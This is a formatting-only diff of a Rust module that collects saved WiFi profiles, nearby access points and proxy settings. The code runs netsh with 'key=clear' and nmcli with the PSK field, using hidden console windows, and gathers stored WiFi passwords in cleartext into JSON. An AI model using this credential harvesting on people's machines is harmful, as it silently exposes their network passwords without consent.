@@ -1,9 +1,9 @@
 //! WiFi profile collection and nearby AP scanning (netsh / nmcli / iwlist).
 
 use super::escape;
-use super::wlan_ffi::WifiApInfo;
 #[cfg(target_os = "windows")]
 use super::wlan_ffi::scan_wifi_wlanapi;
+use super::wlan_ffi::WifiApInfo;
 
 /// Frequency in kHz → band label
 #[cfg(not(target_os = "windows"))]
@@ -53,7 +53,9 @@ pub(super) fn collect_wifi() -> String {
                 past_separator = true;
                 continue;
             }
-            if !past_separator { continue; }
+            if !past_separator {
+                continue;
+            }
             // Profile lines have format: "    <label> : <profile_name>"
             // Extract value after the LAST colon
             if let Some(colon_pos) = trimmed.rfind(':') {
@@ -68,7 +70,13 @@ pub(super) fn collect_wifi() -> String {
         let mut profiles = Vec::new();
         for name in &profile_names {
             if let Ok(output) = std::process::Command::new("netsh")
-                .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
+                .args([
+                    "wlan",
+                    "show",
+                    "profile",
+                    &format!("name={}", name),
+                    "key=clear",
+                ])
                 .creation_flags(0x08000000)
                 .output()
             {
@@ -79,8 +87,7 @@ pub(super) fn collect_wifi() -> String {
                     // Match both English "Key Content" and Chinese "密钥内容"
                     // Also match by position: it's the field containing "key" (case-insensitive) or "密钥"
                     let lower = t.to_lowercase();
-                    if (lower.contains("key content") || t.contains("密钥内容"))
-                        && t.contains(':')
+                    if (lower.contains("key content") || t.contains("密钥内容")) && t.contains(':')
                     {
                         password = t.splitn(2, ':').nth(1).unwrap_or("").trim().to_string();
                         break;
@@ -88,7 +95,8 @@ pub(super) fn collect_wifi() -> String {
                 }
                 profiles.push(format!(
                     r#"{{"ssid":"{}","password":"{}"}}"#,
-                    escape(name), escape(&password)
+                    escape(name),
+                    escape(&password)
                 ));
             }
         }
@@ -109,19 +117,29 @@ pub(super) fn collect_wifi() -> String {
                     let ssid = parts[0];
                     let mut password = String::new();
                     if let Ok(detail) = std::process::Command::new("nmcli")
-                        .args(["-s", "-t", "-f", "802-11-wireless-security.psk", "connection", "show", ssid])
+                        .args([
+                            "-s",
+                            "-t",
+                            "-f",
+                            "802-11-wireless-security.psk",
+                            "connection",
+                            "show",
+                            ssid,
+                        ])
                         .output()
                     {
                         let pw_text = String::from_utf8_lossy(&detail.stdout);
                         for pw_line in pw_text.lines() {
-                            if let Some(val) = pw_line.strip_prefix("802-11-wireless-security.psk:") {
+                            if let Some(val) = pw_line.strip_prefix("802-11-wireless-security.psk:")
+                            {
                                 password = val.to_string();
                             }
                         }
                     }
                     profiles.push(format!(
                         r#"{{"ssid":"{}","password":"{}"}}"#,
-                        escape(ssid), escape(&password)
+                        escape(ssid),
+                        escape(&password)
                     ));
                 }
             }
@@ -159,7 +177,14 @@ pub(super) fn collect_wifi_bssid() -> String {
         // Linux: try nmcli device wifi list
         let mut ap_list: Vec<WifiApInfo> = Vec::new();
         if let Ok(output) = std::process::Command::new("nmcli")
-            .args(["-t", "-f", "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY", "device", "wifi", "list"])
+            .args([
+                "-t",
+                "-f",
+                "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY",
+                "device",
+                "wifi",
+                "list",
+            ])
             .output()
         {
             let text = String::from_utf8_lossy(&output.stdout);
@@ -167,8 +192,13 @@ pub(super) fn collect_wifi_bssid() -> String {
                 let parts: Vec<&str> = line.splitn(7, ':').collect();
                 if parts.len() >= 6 {
                     let ssid = parts[0].replace("\\:", ":");
-                    if ssid.is_empty() { continue; }
-                    let bssid = parts.get(1).map(|s| s.replace("\\:", ":")).unwrap_or_default();
+                    if ssid.is_empty() {
+                        continue;
+                    }
+                    let bssid = parts
+                        .get(1)
+                        .map(|s| s.replace("\\:", ":"))
+                        .unwrap_or_default();
                     let signal: u32 = parts.get(4).unwrap_or(&"0").parse().unwrap_or(0);
                     let security = parts.get(5).unwrap_or(&"");
                     let auth = match *security {
@@ -194,10 +224,7 @@ pub(super) fn collect_wifi_bssid() -> String {
         }
         // Fallback: iwlist scan
         if ap_list.is_empty() {
-            if let Ok(output) = std::process::Command::new("iwlist")
-                .args(["scan"])
-                .output()
-            {
+            if let Ok(output) = std::process::Command::new("iwlist").args(["scan"]).output() {
                 let text = String::from_utf8_lossy(&output.stdout);
                 let mut ssid = String::new();
                 let mut bssid = String::new();
@@ -228,12 +255,18 @@ pub(super) fn collect_wifi_bssid() -> String {
                         bssid = t.trim_start_matches("Address:").trim().to_string();
                     } else if t.contains("Frequency:") {
                         if let Some(f) = t.split_whitespace().nth(2) {
-                            freq = (f.parse::<f64>().unwrap_or(0.0) * 1_000_000.0) as u32; // GHz → kHz
+                            freq = (f.parse::<f64>().unwrap_or(0.0) * 1_000_000.0) as u32;
+                            // GHz → kHz
                         }
                     } else if let Some(q) = t.strip_prefix("Quality=") {
                         if let Some(slash) = q.find('/') {
                             let num: u32 = q[..slash].trim().parse().unwrap_or(0);
-                            let den: u32 = q[slash+1..].split_whitespace().next().unwrap_or("1").parse().unwrap_or(1);
+                            let den: u32 = q[slash + 1..]
+                                .split_whitespace()
+                                .next()
+                                .unwrap_or("1")
+                                .parse()
+                                .unwrap_or(1);
                             signal = (num * 100 / den).min(100);
                         }
                     }
@@ -367,7 +400,10 @@ pub(super) fn collect_proxy() -> String {
     {
         use std::os::windows::process::CommandExt;
         if let Ok(output) = std::process::Command::new("reg")
-            .args(["query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"])
+            .args([
+                "query",
+                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
+            ])
             .creation_flags(0x08000000)
             .output()
         {
@@ -378,7 +414,12 @@ pub(super) fn collect_proxy() -> String {
                 if let Some(pos) = text.find(search) {
                     let rest = &text[pos + search.len()..];
                     if let Some(reg_pos) = rest.find("REG_SZ") {
-                        rest[reg_pos + 6..].lines().next().unwrap_or("").trim().to_string()
+                        rest[reg_pos + 6..]
+                            .lines()
+                            .next()
+                            .unwrap_or("")
+                            .trim()
+                            .to_string()
                     } else {
                         String::new()
                     }
@@ -389,11 +430,15 @@ pub(super) fn collect_proxy() -> String {
 
             let port: u16 = if let Some(colon) = server.rfind(':') {
                 server[colon + 1..].parse().unwrap_or(0)
-            } else { 0 };
+            } else {
+                0
+            };
 
             return format!(
                 r#"{{"enabled":{},"server":"{}","port":{},"bypass":""}}"#,
-                enabled, escape(&server), port
+                enabled,
+                escape(&server),
+                port
             );
         }
     }
@@ -405,12 +450,17 @@ pub(super) fn collect_proxy() -> String {
         let https_proxy = std::env::var("HTTPS_PROXY")
             .or_else(|_| std::env::var("https_proxy"))
             .unwrap_or_default();
-        let all_proxy = if !https_proxy.is_empty() { &https_proxy } else { &http_proxy };
+        let all_proxy = if !https_proxy.is_empty() {
+            &https_proxy
+        } else {
+            &http_proxy
+        };
         let enabled = !all_proxy.is_empty();
 
         return format!(
             r#"{{"enabled":{},"server":"{}","port":0,"bypass":""}}"#,
-            enabled, escape(all_proxy)
+            enabled,
+            escape(all_proxy)
         );
     }
     #[allow(unreachable_code)]
